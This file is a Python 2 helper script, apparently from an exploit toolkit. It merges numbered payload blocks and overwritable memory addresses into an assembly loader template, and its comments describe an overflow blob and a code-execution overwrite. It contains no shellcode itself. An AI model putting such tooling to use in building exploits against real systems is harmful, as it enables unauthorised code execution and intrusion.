#!/usr/bin/env python
#
#  given a VERSION_skel.s template (from EPICBANANA devs)
#    and a VERSION_payload.txt payload (from BANALMONKEY devs)
# generate VERSION_loader.s
#
# VERSION_loader.s to be transmogrified into VERSION_loader.py for use by VERSION.py
#

import sys
import string
import re
import fileinput


if len(sys.argv) != 3:
    print "usage: %s <VERSION_skeleton.s> <VERSION_payload.txt>" % (sys.argv[0])
    sys.exit(1)

skel_file = sys.argv[1]
payload_file = sys.argv[2]

# check the filenames, consistent version required
# don't care what the payload.txt file called, just so it has a version_ prefix
(version1, fname) = string.split(skel_file, "_", 1)
if fname != "skeleton.s":
    print "bad skeleton file name %s, should be VERSION_skeleton.s" % skel_file
    sys.exit(1)
(version2, fname) = string.split(payload_file, "_", 1)

if version1 != version2:
    print "versions on skeleton file and payload file differ, %s vs %s" % (version1, version2)
    sys.exit(1)
version = version1

loader_file = version + "_loader.s"


print
print "  %s + highmem.s + %s = %s" % (skel_file, payload_file, loader_file)
print


# slurp the payload file for blocks to sub into the skeleton, build list of strings
blocks = []
for block in range(14):
    blocks.append("")
start_re = re.compile("^block(\d+)_start$")
end_re = re.compile("^block(\d+)_end$")
block_num = 0
for line in fileinput.input(payload_file):
    start_match = start_re.match(line)
    end_match = end_re.match(line)
    if start_match:
        start_block_num = int(start_match.group(1))
        block_num = start_block_num
        #print "payload block %d start found" % start_block_num
    elif end_match:
        end_block_num = int(end_match.group(1))
        #print "payload block %d end found" % end_block_num
        block_num = 0
        if end_block_num != start_block_num:
            print "block label mismatch in %s, %d vs %d" % (payload_file, start_block_num, end_block_num)
    else:
        # skip lines outside blocks
        if block_num > 0:
            #print "found a line for block %d: %s" % (block_num, line)
            blocks[block_num] += line


# slurp the highmem file for stompable addrs to use instead of those listed
try:
    highmem_file = open("highmem.s", "r")
except:
    print "problem opening the highmem.s file, did you \"make 256M\" for the appropriate memory size?"
    sys.exit(1)

highmem = string.join(highmem_file.readlines(), "")

try:
    highmem_file.close()
except:
    print "failed to close highmem file"
    sys.exit(1)


# get ready to process the skel file
try:
    outfile = open(loader_file, "w")
    outfile.write("/* this file autogenerated, you probably don't want to touch */\n\n")
except:
    print "failed to open output file"
    sys.exit(1)

# main loop: copy skel file to loader file, sub'ing in chunks of payload where needed
block_re = re.compile("__INSERT_PAYLOAD_BLOCKS_HERE__")
addr_re = re.compile("__INSERT_HIGHMEM_ADDRS_HERE__")
try:
    for line in fileinput.input(skel_file):
        insert_match = block_re.match(line)
        addr_match = addr_re.match(line)
        if insert_match:
            for b in range(2, 14):
                if blocks[b] != "":
                    outfile.write(".globl block%d_start\n" % b)
                    outfile.write("block%d_start:\n" % b)
                    outfile.write(blocks[b])
                    outfile.write(".globl block%d_end\n" % b)
                    outfile.write("block%d_end:\n" % b)
                    outfile.write("\n")
        elif addr_match:
            outfile.write(highmem)
            outfile.write(".set block14addr, orig_func_ptr_loc\n")
            outfile.write("\n")
            outfile.write(".globl block0addr  /* the overflow blob, sacrificial */\n")
            outfile.write(".globl block1addr  /* 1, first code, exploit cleanup/decode/overhead stuff */\n")
            outfile.write(".globl block2addr  /* 2, first real payload, you get 12 blocks: 2..13 */\n")
            outfile.write(".globl block3addr\n")
            outfile.write(".globl block4addr\n")
            outfile.write(".globl block5addr\n")
            outfile.write(".globl block6addr\n")
            outfile.write(".globl block7addr\n")
            outfile.write(".globl block8addr\n")
            outfile.write(".globl block9addr\n")
            outfile.write(".globl block10addr\n")
            outfile.write(".globl block11addr\n")
            outfile.write(".globl block12addr\n")
            outfile.write(".globl block13addr  /* 13, last payload, get out */\n")
            outfile.write(".globl block14addr  /* 14, code exec overwrite */\n")
        else:
            outfile.write(line)
except:
    print "problem in processing"
    sys.exit(1)

try:
    outfile.close()
except:
    print "failed to close output file"
    sys.exit(1)
